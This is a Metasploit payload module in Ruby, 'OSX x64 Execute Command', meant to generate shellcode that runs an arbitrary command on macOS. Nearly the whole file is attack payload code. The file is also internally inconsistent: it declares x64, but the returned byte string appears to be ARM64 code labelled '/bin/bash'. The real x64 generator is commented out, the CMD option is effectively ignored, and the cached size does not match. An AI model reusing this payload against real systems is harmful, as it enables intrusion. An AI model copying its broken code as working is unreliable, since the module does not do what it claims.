##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 31

  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OSX x64 Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        => [ 'alanfoster' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_X64
    ))

    # exec payload options
    register_options([
      OptString.new('CMD',  [ true,  "The command string to execute" ])
    ])
  end

  # build the shellcode payload dynamically based on the user-provided CMD
  def generate(_opts = {})
    # cmd_str = datastore['CMD'] || ''
    # # Split the cmd string into arg chunks
    # cmd_parts = Shellwords.shellsplit(cmd_str)
    # cmd_parts = ([cmd_parts.first] + (cmd_parts[1..-1] || []).reverse).compact
    # arg_str = cmd_parts.map { |a| "#{a}\x00" }.join
    # call = "\xe8" + [arg_str.length].pack('V')
    # payload =
    #   "\x48\x31\xd2"+                                 # xor rdx, rdx
    #   call +                                          # call CMD.len
    #   arg_str  +                                      # CMD
    #   "\x5f" +                                        # pop rdi
    #   if cmd_parts.length > 1
    #     "\x48\x89\xf9" +                            # mov rcx, rdi
    #     "\x52" +                                    # push rdx (null)
    #     # for each arg, push its current memory location on to the stack
    #     cmd_parts[1..-1].each_with_index.map do |arg, idx|
    #       "\x48\x81\xc1" +                        # add rcx + ...
    #       [cmd_parts[idx].length+1].pack('V') +   #
    #       "\x51"                                  # push rcx (build str array)
    #     end.join
    #   else
    #     "\x52"                                      # push rdx (null)
    #   end +
    #   "\x57"+                                         # push rdi
    #   "\x48\x89\xe6"+	                                # mov rsi, rsp
    #   "\x48\xc7\xc0\x3b\x00\x00\x02" +                # mov rax, 0x200003b (execve)
    #   "\x0f\x05"                                      # syscall

    string = datastore['CMD']
    create_string_in_stack(string)

    # /bin/bash
    "\xe5\x45\x8c\xd2\x25\xcd\xad\xf2\xe5\x45\xcc\xf2\x25\x6c\xee\xf2\xe5\x03\x1e\xf8\x05\x0d\x80\xd2\x05\x00\xa0\xf2\x05\x00\xc0\xf2\x05\x00\xe0\xf2\xe5\x83\x1e\xf8\xe5\x03\x00\x91\xa5\x80\x00\xd1\xe5\x7f\x3f\xa9\xf0\x00\x00\x58\xe0\x03\x00\x91\x00\x80\x00\xd1\xe1\x03\x00\x91\x21\x40\x00\xd1\xe2\x03\x1f\xaa\x01\x00\x00\xd4\x3b\x00\x00\x02\x00\x00\x00\x00".b
  end

  def create_string_in_stack(string)
    string
  end
end
